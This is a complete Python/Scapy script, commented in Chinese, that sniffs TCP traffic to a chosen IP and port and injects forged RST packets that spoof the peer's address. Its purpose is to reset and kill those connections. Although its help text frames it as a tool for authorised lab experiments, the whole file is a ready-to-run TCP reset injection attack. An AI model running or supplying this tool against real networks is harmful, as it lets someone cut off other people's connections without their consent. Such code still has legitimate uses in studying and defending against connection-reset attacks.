#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
python tcp_rst.py --target-ip 192.168.55.123 --target-port 80 --capture-interface "VMware Network Adapter VMnet1" --inject-interface "VMware Network Adapter VMnet1"
"""

import argparse
import sys
from scapy.all import *
from scapy.layers.inet import IP, TCP

# 环境检测
if sys.platform == "win32":
    try:
        from scapy.arch.windows import get_windows_if_list
        print("[*] 检测到 Windows 系统，请确保已安装 Npcap (WinPcap兼容模式)")
    except ImportError:
        print("[-] Windows 系统需要安装 Npcap: https://npcap.com/")
        sys.exit(1)

# RST 注入逻辑
def send_rst_packet(pkt, iface):
    if not pkt.haslayer(TCP) or not pkt.haslayer(IP):
        return

    ip = pkt[IP]
    tcp = pkt[TCP]

    # ========== 规则 1：如果对方的包带 ACK ==========
    if tcp.flags & 0x10:  # ACK 位为 1
        rst_seq = tcp.ack  # 取 ACK 字段作为 SEQ
        rst_ack = 0
        rst_flags = "R"
        print(f"[RST-ACK] 来自 {ip.src}:{tcp.sport} 的 ACK 包，构造 RST SEQ={rst_seq}")
    else:
        # ========== 规则 2：如果对方包不带 ACK ==========
        # ACK 字段为对方 SEQ + 负载长度（没有负载时加 1）
        tcp_payload_len = len(pkt[TCP].payload)
        rst_seq = 0
        rst_ack = tcp.seq + tcp_payload_len + 1
        rst_flags = "RA"
        print(f"[RST-NOACK] 非 ACK 包，构造 RST ACK={rst_ack}")

    # 反转方向（伪造目标主机发给源主机）
    rst_pkt = IP(src=ip.dst, dst=ip.src) / TCP(
        sport=tcp.dport,
        dport=tcp.sport,
        seq=rst_seq,
        ack=rst_ack,
        flags=rst_flags,
        window=0
    )

    send(rst_pkt, iface=iface, verbose=False)
    print(f"[+] 发送 RST -> {ip.src}:{tcp.sport}")

# 抓包主逻辑
def sniff_and_inject(target_ip, target_port, capture_iface, inject_iface):
    print(f"[*] 开始监听 {capture_iface} 上的流量，目标 {target_ip}:{target_port}")

    def pkt_handler(pkt):
        if pkt.haslayer(TCP) and pkt.haslayer(IP):
            ip = pkt[IP]
            tcp = pkt[TCP]
            # 只针对目标 IP+端口的 TCP 流量
            if (ip.src == target_ip or ip.dst == target_ip) and (tcp.sport == target_port or tcp.dport == target_port):
                send_rst_packet(pkt, inject_iface)

    sniff(
        iface=capture_iface,
        prn=pkt_handler,
        filter=f"tcp and host {target_ip} and port {target_port}",
        store=False
    )

# 主函数
def main():
    parser = argparse.ArgumentParser(description="TCP RST 报文注入实验工具（合法授权环境）")
    parser.add_argument("--target-ip", required=True, help="目标 IP")
    parser.add_argument("--target-port", type=int, required=True, help="目标端口")
    parser.add_argument("--capture-interface", required=True, help="抓包接口")
    parser.add_argument("--inject-interface", required=True, help="注入接口")
    args = parser.parse_args()

    sniff_and_inject(args.target_ip, args.target_port, args.capture_interface, args.inject_interface)

if __name__ == "__main__":
    main()
